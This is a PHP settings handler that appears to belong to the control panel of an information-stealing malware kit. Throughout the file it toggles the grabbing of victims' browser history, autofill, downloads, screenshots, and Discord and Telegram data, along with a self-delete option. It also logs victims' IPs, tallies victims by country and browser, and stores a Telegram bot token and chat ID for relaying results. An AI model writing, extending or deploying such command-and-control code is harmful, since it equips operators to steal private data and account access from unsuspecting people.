<?php 
require_once '../../db.php';

if(isset($_POST['func']))
{
	switch (trim($_POST['func'])) {
	case "clearDB":
		clearDB();
		break;
	case "dublicate":
		dublicate();
		break;
	case "bot":
		bot();
		break;
	case "savetoken":
		savetoken();
		break;
	case "savechatid":
		savechatid();
		break;
	case "grabparams":
		grabparams();
		break;
	case "logsparams":
		logsparams();
		break;
	}
}

//////////////////////

function clearDB(){
	R::wipe('grabrule');
	R::wipe('loader');
	R::wipe('log');
	R::wipe('markerrule');
	R::wipe('topsites');
	$stats = R::findAll("statistics_countries");
	foreach ($stats as $stat)
	{
		$stat->count_c = 0;
		R::store($stat);
	}
	$browsers = R::findAll("browsers");
	foreach ($browsers as $browser)
	{
		$browser->count_c = 0;
		R::store($browser);
	}
};

//////////////////////

function dublicate(){
	$settings = R::load('settings', 1);
	$settings->dublicates = (boolean)json_decode(strtolower($_POST['check'])); 
	R::store($settings);
	echo $result = json_encode($settings->dublicates);	
}

//////////////////////

function grabparams(){
	$settings = R::load('settings', 1);
	switch (trim($_POST['param'])) {
	case "downloadsCheckbox":
		$settings->grab_downloads = (boolean)json_decode(strtolower($_POST['check'])); 
		echo $result = json_encode($settings->grab_downloads);
		break;
	case "historyCheckbox":
		$settings->grab_history = (boolean)json_decode(strtolower($_POST['check'])); 
		echo $result = json_encode($settings->grab_history);
		break;
	case "autofillCheckbox":
		$settings->grab_autofill = (boolean)json_decode(strtolower($_POST['check'])); 
		echo $result = json_encode($settings->grab_autofill);
		break;
	case "screenshotCheckbox":
		$settings->grab_screenshot = (boolean)json_decode(strtolower($_POST['check'])); 
		echo $result = json_encode($settings->grab_screenshot);
		break;
	case "discordCheckbox":
		$settings->grab_discord = (boolean)json_decode(strtolower($_POST['check'])); 
		echo $result = json_encode($settings->grab_discord);
		break;
	case "telegramCheckbox":
		$settings->grab_telegram = (boolean)json_decode(strtolower($_POST['check'])); 
		echo $result = json_encode($settings->grab_telegram);
		break;
	case "selfdeleteCheckbox":
		$settings->selfdelete = (boolean)json_decode(strtolower($_POST['check'])); 
		echo $result = json_encode($settings->selfdelete);
		break;
	}
	R::store($settings);
}

//////////////////////

function logsparams(){
	$settings = R::load('settings', 1);
	switch (trim($_POST['param'])) {
	case "commentCheckbox":
		$settings->logs_comment = (boolean)json_decode(strtolower($_POST['check'])); 
		echo $result = json_encode($settings->logs_comment);
		break;
	case "dataCheckbox":
		$settings->logs_data = (boolean)json_decode(strtolower($_POST['check'])); 
		echo $result = json_encode($settings->logs_data);
		break;
	case "markerCheckbox":
		$settings->logs_marker = (boolean)json_decode(strtolower($_POST['check'])); 
		echo $result = json_encode($settings->logs_marker);
		break;
	case "ipCheckbox":
		$settings->logs_ip = (boolean)json_decode(strtolower($_POST['check'])); 
		echo $result = json_encode($settings->logs_ip);
		break;
	case "screenshot2Checkbox":
		$settings->logs_screenshot = (boolean)json_decode(strtolower($_POST['check'])); 
		echo $result = json_encode($settings->logs_screenshot);
		break;
	case "actionsCheckbox":
		$settings->logs_actions = (boolean)json_decode(strtolower($_POST['check'])); 
		echo $result = json_encode($settings->logs_actions);
		break;
	case "dateCheckbox":
		$settings->logs_date = (boolean)json_decode(strtolower($_POST['check'])); 
		echo $result = json_encode($settings->logs_date);
		break;
	case "screentgCheckbox":
		$settings->bot_scr = (boolean)json_decode(strtolower($_POST['check'])); 
		echo $result = json_encode($settings->bot_scr);
		break;
	}
	R::store($settings);
}

//////////////////////

function bot(){
	$settings = R::load('settings', 1);
	$settings->bot_enable = (boolean)json_decode(strtolower($_POST['check'])); 
	R::store($settings);
	echo $result = json_encode($settings->bot_enable);	
}

//////////////////////

function savetoken(){
	$settings = R::load('settings', 1);
	$settings->bot_token = trim($_POST['token']);
	R::store($settings);
	echo 'token add';
}

//////////////////////

function savechatid(){
	$settings = R::load('settings', 1);
	$settings->chatid = trim($_POST['chatid']);
	R::store($settings);
	echo 'chatid add';
}


?>
											